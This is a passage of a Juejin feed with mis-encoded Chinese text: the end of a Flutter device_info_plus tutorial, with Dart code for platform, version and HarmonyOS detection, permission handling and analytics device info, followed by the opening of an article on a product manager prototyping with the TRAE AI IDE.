      <span class="hljs-keyword">case</span> TargetPlatform.iOS:
        <span class="hljs-keyword">final</span> info = <span class="hljs-keyword">await</span> _plugin.iosInfo;
        <span class="hljs-keyword">return</span> <span class="hljs-string">"iOS <span class="hljs-subst">${info.systemVersion}</span>"</span>;
      <span class="hljs-keyword">case</span> TargetPlatform.windows:
        <span class="hljs-keyword">final</span> info = <span class="hljs-keyword">await</span> _plugin.windowsInfo;
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Windows <span class="hljs-subst">${info.systemVersion}</span>"</span>;
      <span class="hljs-keyword">case</span> TargetPlatform.macOS:
        <span class="hljs-keyword">final</span> info = <span class="hljs-keyword">await</span> _plugin.macOsInfo;
        <span class="hljs-keyword">return</span> <span class="hljs-string">"macOS <span class="hljs-subst">${info.osVersion}</span>"</span>;
      <span class="hljs-keyword">default</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">"æœªçŸ¥ç³»ç»Ÿ"</span>;
    }
  }

  <span class="hljs-comment">// Androidä¸“å±ï¼šåˆ¤æ–­æ˜¯å¦ä¸ºé¸¿è’™ç³»ç»Ÿï¼ˆé¸¿è’™ä¼ªè£…æˆAndroidï¼‰</span>
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-built_in">bool</span>&gt; isHarmonyOS() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">if</span> (defaultTargetPlatform != TargetPlatform.android) <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
    <span class="hljs-keyword">final</span> info = <span class="hljs-keyword">await</span> _plugin.androidInfo;
    <span class="hljs-comment">// é¸¿è’™ç³»ç»Ÿçš„fingerprintæˆ–brandä¼šåŒ…å«harmonyç›¸å…³å­—æ®µ</span>
    <span class="hljs-keyword">return</span> info.fingerprint.contains(<span class="hljs-string">"harmony"</span>) || info.brand.contains(<span class="hljs-string">"Harmony"</span>);
  }
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">void</span> main() <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">await</span> DeviceInfoUtil.init();
  <span class="hljs-built_in">String</span> deviceType = <span class="hljs-keyword">await</span> DeviceInfoUtil.getDeviceType();
  <span class="hljs-built_in">String</span> sysVersion = <span class="hljs-keyword">await</span> DeviceInfoUtil.getSystemVersion();
  <span class="hljs-built_in">bool</span> isHarmony = <span class="hljs-keyword">await</span> DeviceInfoUtil.isHarmonyOS();
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"è®¾å¤‡ç±»å‹ï¼š<span class="hljs-subst">$deviceType</span>"</span>);
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"ç³»ç»Ÿç‰ˆæœ¬ï¼š<span class="hljs-subst">$sysVersion</span>"</span>);
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ˜¯å¦é¸¿è’™ï¼š<span class="hljs-subst">$isHarmony</span>"</span>);
}
</code></pre>
<h3 data-id="heading-12">2. å®æˆ˜åœºæ™¯ 1ï¼šç‰ˆæœ¬é€‚é…</h3>
<p>æ ¹æ®ç³»ç»Ÿç‰ˆæœ¬æ‰§è¡Œä¸åŒé€»è¾‘ï¼ˆå¦‚ Android æƒé™é€‚é…ï¼‰ï¼š</p>
<pre><code class="hljs language-Dart" lang="Dart"><span class="hljs-comment">// Android 13+ é€šçŸ¥æƒé™é€‚é…</span>
Future&lt;<span class="hljs-keyword">void</span>&gt; requestNotificationPermission() <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">final</span> androidInfo = <span class="hljs-keyword">await</span> deviceInfoPlugin.androidInfo;
  <span class="hljs-keyword">if</span> (androidInfo.version.sdkInt &gt;= <span class="hljs-number">33</span>) { <span class="hljs-comment">// Android 13 (API 33)</span>
    <span class="hljs-comment">// è¯·æ±‚POST_NOTIFICATIONSæƒé™</span>
    <span class="hljs-keyword">final</span> status = <span class="hljs-keyword">await</span> Permission.notification.request();
    <span class="hljs-keyword">if</span> (status.isGranted) {
      <span class="hljs-built_in">print</span>(<span class="hljs-string">"é€šçŸ¥æƒé™å·²æˆäºˆ"</span>);
    }
  }
}
</code></pre>
<h3 data-id="heading-13">3. å®æˆ˜åœºæ™¯ 2ï¼šåŸ‹ç‚¹ç»Ÿè®¡</h3>
<p>æ”¶é›†è®¾å¤‡ä¿¡æ¯ç”¨äºç”¨æˆ·è¡Œä¸ºåˆ†æï¼ˆåˆè§„å‰æä¸‹ï¼‰ï¼š</p>
<pre><code class="hljs language-Dart" lang="Dart"><span class="hljs-comment">// ç”ŸæˆåŸ‹ç‚¹ç”¨çš„è®¾å¤‡ä¿¡æ¯JSON</span>
Future&lt;<span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt;&gt; getTrackDeviceInfo() <span class="hljs-keyword">async</span> {
  <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt; info = {
    <span class="hljs-string">"platform"</span>: kIsWeb ? <span class="hljs-string">"web"</span> : defaultTargetPlatform.name,
    <span class="hljs-string">"device_type"</span>: <span class="hljs-keyword">await</span> DeviceInfoUtil.getDeviceType(),
    <span class="hljs-string">"system_version"</span>: <span class="hljs-keyword">await</span> DeviceInfoUtil.getSystemVersion(),
    <span class="hljs-string">"is_emulator"</span>: <span class="hljs-keyword">false</span>,
  };

  <span class="hljs-keyword">if</span> (defaultTargetPlatform == TargetPlatform.android) {
    <span class="hljs-keyword">final</span> androidInfo = <span class="hljs-keyword">await</span> deviceInfoPlugin.androidInfo;
    info[<span class="hljs-string">"manufacturer"</span>] = androidInfo.manufacturer;
    info[<span class="hljs-string">"model"</span>] = androidInfo.model;
    info[<span class="hljs-string">"is_emulator"</span>] = !androidInfo.isPhysicalDevice;
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (defaultTargetPlatform == TargetPlatform.iOS) {
    <span class="hljs-keyword">final</span> iosInfo = <span class="hljs-keyword">await</span> deviceInfoPlugin.iosInfo;
    info[<span class="hljs-string">"model"</span>] = iosInfo.utsname.machine;
    info[<span class="hljs-string">"is_emulator"</span>] = !iosInfo.isPhysicalDevice;
  }

  <span class="hljs-keyword">return</span> info;
}
</code></pre>
<h2 data-id="heading-14">å››ã€é¿å‘æŒ‡å—ï¼šå¸¸è§é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ</h2>
<h3 data-id="heading-15">1. æƒé™é—®é¢˜</h3>





















<table><thead><tr><th>é—®é¢˜</th><th>è§£å†³æ–¹æ¡ˆ</th></tr></thead><tbody><tr><td>Android 10+ æ— æ³•è·å–<code>androidId</code></td><td>æ”¹ç”¨<code>identifierForVendor</code>ï¼ˆiOSï¼‰æˆ–è‡ªå®šä¹‰ UUIDï¼ˆå¦‚<code>flutter_secure_storage</code>å­˜å‚¨ï¼‰</td></tr><tr><td>iOS è·å–ç”µæ± ä¿¡æ¯å¤±è´¥</td><td>éœ€è¦åœ¨<code>Info.plist</code>ä¸­æ·»åŠ <code>NSBatteryUsageDescription</code>è¯´æ˜ç”¨é€”</td></tr><tr><td>Web æ— æ³•è·å–ç²¾å‡†è®¾å¤‡å‹å·</td><td>Web å—é™äºæµè§ˆå™¨æ²™ç®±ï¼Œåªèƒ½é€šè¿‡ UA è§£æï¼ˆå¯ç»“åˆç¬¬ä¸‰æ–¹åº“<code>ua_parser</code>ï¼‰</td></tr></tbody></table>
<h3 data-id="heading-16">2. å…¼å®¹æ€§é—®é¢˜</h3>





















<table><thead><tr><th>é—®é¢˜</th><th>è§£å†³æ–¹æ¡ˆ</th></tr></thead><tbody><tr><td>æ¨¡æ‹Ÿå™¨ä¸çœŸæœºè¿”å›å€¼å·®å¼‚</td><td>ç”¨<code>isPhysicalDevice</code>åˆ¤æ–­ï¼Œé¿å…æ¨¡æ‹Ÿå™¨æ•°æ®å¹²æ‰°</td></tr><tr><td>ä¸åŒ Android å‚å•†å®šåˆ¶ç³»ç»Ÿå­—æ®µå·®å¼‚</td><td>ä¼˜å…ˆä½¿ç”¨<code>model</code>/<code>manufacturer</code>ï¼Œé¿å…ä¾èµ–<code>fingerprint</code>ç­‰éæ ‡å­—æ®µ</td></tr><tr><td>macOS 14+ è·å–å†…å­˜ä¿¡æ¯å¤±è´¥</td><td>å‡çº§<code>device_info_plus</code>åˆ°æœ€æ–°ç‰ˆæœ¬ï¼ˆ&gt;=10.0.0ï¼‰</td></tr></tbody></table>
<h3 data-id="heading-17">3. æ€§èƒ½ä¸å¼‚æ­¥é—®é¢˜</h3>
<ul>
<li>è®¾å¤‡ä¿¡æ¯è·å–æ˜¯<strong>å¼‚æ­¥æ“ä½œ</strong>ï¼Œä¸è¦åœ¨<code>build</code>æ–¹æ³•ä¸­ç›´æ¥è°ƒç”¨ï¼Œå»ºè®®åœ¨<code>initState</code>æˆ–å…¨å±€åˆå§‹åŒ–æ—¶è·å–ï¼›</li>
<li>é¿å…é¢‘ç¹è°ƒç”¨ï¼ˆå¦‚æ¯æ¬¡ç‚¹å‡»æŒ‰é’®éƒ½è·å–ï¼‰ï¼Œå»ºè®®ç¼“å­˜ç»“æœï¼›</li>
<li>æ— ä¸Šä¸‹æ–‡æ—¶å¿…é¡»å…ˆè°ƒç”¨<code>WidgetsFlutterBinding.ensureInitialized()</code>ï¼Œå¦åˆ™ä¼šå´©æºƒã€‚</li>
</ul>
<h2 data-id="heading-18">æ€»ç»“</h2>
<ol>
<li><strong>æ ¸å¿ƒå®šä½</strong>ï¼š<code>device_info_plus</code> æ˜¯ Flutter å¤šå¹³å°è®¾å¤‡ä¿¡æ¯è·å–çš„å®˜æ–¹é¦–é€‰ï¼Œæ›¿ä»£åºŸå¼ƒçš„<code>device_info</code>ï¼Œè¦†ç›–å…¨å¹³å°ï¼›</li>
<li><strong>ä½¿ç”¨åŸåˆ™</strong>ï¼šæŒ‰å¹³å°è°ƒç”¨å¯¹åº”<code>info</code>æ–¹æ³•ï¼Œä¼˜å…ˆå°è£…ä¸ºå·¥å…·ç±»ï¼Œå¼‚æ­¥æ“ä½œéœ€å¤„ç†å¼‚å¸¸å’Œç¼“å­˜ï¼›</li>
<li><strong>é¿å‘è¦ç‚¹</strong>ï¼šæ³¨æ„æƒé™åˆè§„ã€æ¨¡æ‹Ÿå™¨ / çœŸæœºå·®å¼‚ã€Android 10+ è®¾å¤‡æ ‡è¯†é™åˆ¶ï¼Œæ— ä¸Šä¸‹æ–‡æ—¶å…ˆåˆå§‹åŒ–<code>WidgetsFlutterBinding</code>ã€‚</li>
</ol>
<p>å¦‚æœéœ€è¦é’ˆå¯¹æŸä¸€ç‰¹æ®Šåœºæ™¯ï¼ˆå¦‚é¸¿è’™ç³»ç»Ÿè¯†åˆ«ã€iOS å¹¿å‘Š ID è·å–ã€Web ç«¯è®¾å¤‡æŒ‡çº¹ï¼‰çš„è¯¦ç»†ä»£ç ï¼Œæˆ‘å¯ä»¥è¿›ä¸€æ­¥è¡¥å……ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸æ­¢æ˜¯å†™ä»£ç ï½œäº§å“ç»ç†å¦‚ä½•ç”¨ TRAE é‡æ„å·¥ä½œæµ]]></title>    <link>https://juejin.cn/post/7604315965875159074</link>    <guid>https://juejin.cn/post/7604315965875159074</guid>    <pubDate>2026-02-09T08:07:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604315965875159074" data-draft-id="7604045354071080994" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸æ­¢æ˜¯å†™ä»£ç ï½œäº§å“ç»ç†å¦‚ä½•ç”¨ TRAE é‡æ„å·¥ä½œæµ"/> <meta itemprop="keywords" content="Trae"/> <meta itemprop="datePublished" content="2026-02-09T08:07:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="TRAE_ai"/> <meta itemprop="url" content="https://juejin.cn/user/3048259110571032"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸æ­¢æ˜¯å†™ä»£ç ï½œäº§å“ç»ç†å¦‚ä½•ç”¨ TRAE é‡æ„å·¥ä½œæµ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3048259110571032/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    TRAE_ai
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T08:07:08.000Z" title="Mon Feb 09 2026 08:07:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»29åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6d7f8dc33c07465b963aab25298cbd83~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229228&amp;x-signature=W76L6wcFsiX34U1ocy9wwY09kAU%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>æœ¬æ–‡ä½œè€…ï¼šææ’ï¼ŒBç«¯äº§å“ç»ç†ï¼ŒTRAE æ·±åº¦ç”¨æˆ·</p>
</blockquote>
<p>ä½ æ˜¯å¦ä¹Ÿæœ‰è¿™æ ·çš„ç»å†ï¼š</p>
<p>ä¸€ä¸ªæƒ³æ³•åœ¨è„‘å­é‡Œå·²ç»å¾ˆæ¸…æ¥šäº†ï¼Œä½†çœŸæ­£è¦è½æˆ Demoï¼Œå´è¦ç»å†ç”»åŸå‹ã€åå¤æ”¹ç¨¿ã€å’Œç ”å‘æ¥å›æ‹‰æ‰¯ï¼Œæœ€åä¸Šçº¿çš„æ–¹æ¡ˆï¼Œæ—©å°±å’Œæœ€åˆçš„è®¾æƒ³ä¸å¤ªä¸€æ ·ã€‚</p>
<p>æœ¬æ–‡å°†åˆ†äº«ä¸€åéæŠ€æœ¯èƒŒæ™¯çš„ B ç«¯äº§å“ç»ç†ï¼Œå¦‚ä½•å€ŸåŠ© TRAEï¼ŒæŠŠâ€œæƒ³æ³•â€ç›´æ¥ç¿»è¯‘æˆå¯äº¤äº’åŸå‹ä¸å¯è®¨è®ºæ–¹æ¡ˆï¼š Â ä¸ç”¨ç­‰ç ”å‘ã€ä¸ç”¨åå¤ç”»å›¾ï¼Œä¹Ÿä¸éœ€è¦ç²¾é€šä»£ç ï¼Œå°±èƒ½åœ¨éœ€æ±‚è¿­ä»£ã€0-1 é¡¹ç›®éªŒè¯ã€å¤æ‚é€»è¾‘å¯¹é½ä¸­ï¼ŒæŠŠæ•ˆç‡æå‡æ•°å€ã€‚</p>
<p>è¿™ä¸æ˜¯ä¸€ç¯‡ç®€å•çš„å·¥å…·ä»‹ç»ï¼Œè€Œæ˜¯ä¸€å¥—å·²ç»åœ¨çœŸå®å·¥ä½œä¸­åå¤éªŒè¯è¿‡çš„å®è·µæ–¹æ³•ï¼Œè¦†ç›–ä»éœ€æ±‚éªŒè¯ã€åŸå‹è¿­ä»£ï¼Œåˆ°é€»è¾‘è·‘é€šä¸æ–‡æ¡£å¯¹é½çš„å…¨è¿‡ç¨‹ã€‚å®ƒå°†å‘Šè¯‰ä½ ï¼Œä¸€ä¸ªäº§å“ç»ç†ï¼Œå¦‚ä½•å€ŸåŠ© TRAE æŠŠæ•ˆç‡è¿™ä»¶äº‹åšåˆ°æè‡´ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a91f5318f42a4f41bae138ed82279b31~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229228&amp;x-signature=JRXvmUG4k533MYd1TSt2W5N%2Butc%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0"><strong>ä¸ºä»€ä¹ˆæˆ‘è¦å†™è¿™ç¯‡æ–‡ç« ï¼Ÿ</strong></h2>
<p>æˆ‘æ˜¯ä¸€åè´Ÿè´£ B ç«¯åŠŸèƒ½å‹äº§å“çš„äº§å“ç»ç†ï¼Œæ—¥å¸¸å¤„ç†çš„æ˜¯å¤æ‚çš„ä¸šåŠ¡é€»è¾‘å’Œåå°ç³»ç»Ÿã€‚åœ¨æ¥è§¦ TRAE ä¹‹å‰ï¼Œæˆ‘çš„å·¥ä½œè·¯å¾„æ˜¯ï¼š<strong>ç”»åŸå‹ -&gt; å†™æ–‡æ¡£ -&gt; ç­‰æ’æœŸ -&gt; åå¤è°ƒæ•´ã€‚</strong></p>
<p>ç›´åˆ°æˆ‘å¼€å§‹å°è¯•ï¼ŒæŠŠ TRAE å½“æˆâ€œå·¥ä½œä¼™ä¼´â€è€Œä¸æ˜¯â€œå†™ä»£ç çš„å·¥å…·â€ã€‚æœ¬æ–‡å°†å›´ç»•äº§å“ç»ç†çš„ 3 ä¸ªæ ¸å¿ƒå·¥ä½œåœºæ™¯å±•å¼€ï¼š</p>
<ol>
<li>
<p><strong>éœ€æ±‚è¿­ä»£çš„åŸå‹è®¾è®¡</strong></p>
</li>
<li>
<p><strong>0-1 çš„é¡¹ç›®åŸå‹ + é€»è¾‘éªŒè¯</strong></p>
</li>
<li>
<p><strong>æ–‡æ¡£çš„ç¼–å†™ä¸å¯¹é½</strong></p>
</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b02afacf94b345de927060c43033240c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229228&amp;x-signature=4MABBEBbh7FfEFU4kzFG%2B60EsiA%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1"><strong>æ ¸å¿ƒè®¤çŸ¥ï¼šTRAE æ˜¯ã€Œæƒ³æ³•ç¿»è¯‘å™¨ã€</strong></h2>
<p>åœ¨æ·±å…¥åœºæ™¯å‰ï¼Œæˆ‘ä»¬éœ€è¦é‡å¡‘è®¤çŸ¥ï¼š<strong>TRAE çš„æœ¬è´¨æ˜¯ä¸€ä¸ªé«˜æ•ˆçš„â€œç¿»è¯‘å™¨â€ã€‚</strong></p>
<p>å®ƒæ— æ³•å‡­ç©ºç†è§£æ¨¡ç³Šçš„æ„å›¾ï¼Œä½†åªè¦ä½ èƒ½æ¸…æ™°æè¿°é€»è¾‘ï¼Œå®ƒå°±èƒ½å°†æƒ³æ³•ç²¾å‡†åœ°â€œç¿»è¯‘â€æˆå¯äº¤äº’ã€é«˜ä¿çœŸçš„å‰ç«¯åº”ç”¨ã€‚è¿™æ„å‘³ç€ï¼š</p>
<ul>
<li>
<p><strong>è§£æ”¾åŒæ‰‹ï¼š</strong> ä»ç¹ççš„â€œç”»å›¾â€å·¥ä½œä¸­è§£æ”¾ï¼Œå‘Šåˆ«åƒç´ çº§çš„å¯¹é½å’Œç»„ä»¶æ‹–æ‹½ã€‚</p>
</li>
<li>
<p><strong>èšç„¦æ€è€ƒï¼š</strong> ç²¾åŠ›æŠ•å…¥åˆ°æ¢³ç†äº§å“é€»è¾‘ã€å®šä¹‰ç”¨æˆ·æµç¨‹å’Œæ„æ€äº¤äº’ç»†èŠ‚ä¸Šã€‚</p>
</li>
<li>
<p><strong>é«˜ä¿çœŸäº¤ä»˜ï¼š</strong> åŸå‹ä¸å†æ˜¯é™æ€çº¿æ¡†å›¾ï¼Œè€Œæ˜¯åŠ¨æ€çš„ã€é«˜ä¿çœŸçš„ HTML é¡µé¢ ã€‚</p>
</li>
</ul>
<p>è¿™ä¸ªè½¬å˜ï¼Œæ˜¯åç»­æ‰€æœ‰æ•ˆç‡æå‡å’Œèƒ½åŠ›é£è·ƒçš„åŸºç¡€ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b26fe32636144ac091a9adef3f97ba5d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229228&amp;x-signature=xedS1xqOvYmxvlar4nsITFDYNvI%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2"><strong>åä½œåŸåˆ™ï¼šå°æ­¥å¿«è·‘ï¼Œå¢é‡è¿­ä»£</strong></h2>
<p><strong>ä¸ TRAE åä½œï¼Œæœ€é‡è¦çš„åŸåˆ™æ˜¯ï¼šå°æ­¥å¿«è·‘ï¼Œæ‹’ç»ä¸€å£æ°”åƒæˆèƒ–å­ã€‚</strong></p>
<p>ä¸å…¶è¯•å›¾ç”¨ä¸€æ®µå†—é•¿è€Œå¤æ‚çš„æŒ‡ä»¤ç”Ÿæˆå®Œç¾ç³»ç»Ÿï¼Œä¸å¦‚å°†ç›®æ ‡æ‹†è§£æˆä¸€ä¸ªä¸ªå…·ä½“ã€æ˜ç¡®çš„å°æ­¥éª¤ï¼Œé€šè¿‡æŒç»­çš„ã€å¢é‡å¼çš„è¿­ä»£æ¥é€æ­¥å®Œå–„ã€‚è¿™å¥—æ–¹æ³•è®ºå¯ä»¥æ¦‚æ‹¬ä¸ºâ€œæ¡†æ¶-ç»„ä»¶-äº¤äº’â€ä¸‰æ­¥èµ°ï¼š</p>
<ol>
<li>
<p><strong>å…ˆæ­æ¡†æ¶ï¼š</strong> è®© TARE ç”Ÿæˆæœ€åŸºç¡€çš„é¡µé¢å¸ƒå±€å’Œç»“æ„ã€‚</p>
</li>
<li>
<p><strong>å†å¡«ç»„ä»¶ï¼š</strong> åœ¨æ¡†æ¶å†…é€æ­¥æ·»åŠ å¿…è¦çš„ UI ç»„ä»¶ï¼Œå¦‚æŒ‰é’®ã€è¾“å…¥æ¡†ã€åˆ—è¡¨ç­‰ã€‚</p>
</li>
<li>
<p><strong>åè°ƒäº¤äº’ï¼š</strong> æœ€åä¸ºè¿™äº›ç»„ä»¶æ³¨å…¥ç”Ÿå‘½ï¼Œå®ç°ç‚¹å‡»ã€è·³è½¬ã€æ•°æ®åŠ è½½ç­‰åŠ¨æ€äº¤äº’ã€‚</p>
</li>
</ol>
<p>å§‹ç»ˆè®°ä½ï¼Œæ¯ä¸€æ¬¡ä¸ TRAE çš„äº¤äº’éƒ½åº”è¯¥åªå…³æ³¨ä¸€ä¸ªå…·ä½“ã€æ˜ç¡®çš„ç›®æ ‡ã€‚è¿™æ ·çš„â€œå°æ­¥å¿«è·‘â€ï¼Œä¸ä»…èƒ½ä¿è¯ TRAE çš„ç†è§£å‡†ç¡®ç‡ï¼Œä¹Ÿè®©ä½ èƒ½å§‹ç»ˆæŒæ§é¡¹ç›®çš„è¿›å±•å’Œæ–¹å‘ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8c9464ba06b547b4a546c89781923675~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229228&amp;x-signature=Bek%2FHv0iMbVQBNuyhjsFuyffXYw%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-3"><strong>ä¸‰å¤§æ ¸å¿ƒåœºæ™¯ï¼šç”¨ TRAE é‡æ„äº§å“å·¥ä½œæµ</strong></h2>
